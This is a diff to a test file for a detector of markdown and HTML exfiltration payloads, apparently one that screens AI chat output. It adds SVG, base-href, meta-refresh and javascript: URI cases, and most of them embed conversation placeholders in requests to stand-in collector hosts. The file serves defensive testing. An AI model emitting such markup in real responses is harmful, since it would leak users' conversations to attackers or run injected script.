@@ -239,7 +239,6 @@ EXFIL_IMAGE = "![status](https://collect.attacker.test/p.png?d={conversation})"
         ("\ud800 [docs](https://a.test/) ![a](https://a.test/{c}.png)", ["exfiltration_query"]),
         ("<svg><image href='https://collector.test/{conversation}.png'/></svg>", ["exfiltration_query"]),
         ("<svg><feImage xlink:href='https://collector.test/{conversation}.png'/></svg>", ["exfiltration_query"]),
-        ("<a xlink:href='https://api.test/users/{id}'>user</a>", []),
         ("<link rel='stylesheet' href='https://collector.test/{conversation}.css'>", ["exfiltration_query"]),
         ("<link rel='preload' as='image' href='https://collector.test/{conversation}.png'>", ["exfiltration_query"]),
         (
@@ -274,6 +273,18 @@ EXFIL_IMAGE = "![status](https://collect.attacker.test/p.png?d={conversation})"
         ("<img src='/{c}.png'><base href='https://collector.test/'>", ["exfiltration_query"]),
         ("<img src='/{c}.png'>", []),
         ("<base href=''><base href='https://collector.test/'><img src='/{c}.png'>", []),
+        (
+            "<svg><base href=''></base></svg><base href='https://collector.test/'><img src='/{c}.png'>",
+            ["exfiltration_query"],
+        ),
+        ("<a xlink:href='javascript:alert(1)'>label</a>", []),
+        ("<svg><a xlink:href='javascript:alert(1)'><text>x</text></a></svg>", ["script_uri"]),
+        ("<svg><a href='javascript:alert(1)'><text>x</text></a></svg>", ["script_uri"]),
+        (
+            "<svg><meta http-equiv='refresh' content='0; url=https://collector.test/?q={c}'/></svg>",
+            ["exfiltration_query"],
+        ),
+        ("<svg><g><base href='https://collector.test/'/></g></svg><img src='/{c}.png'>", []),
         ("<image src='https://collector.test/{c}.png'>", ["exfiltration_query"]),
         ("<svg><script href='https://collector.test/{c}.js'></script></svg>", ["exfiltration_query"]),
         ("<svg><script xlink:href='https://collector.test/{c}.js'></script></svg>", ["exfiltration_query"]),
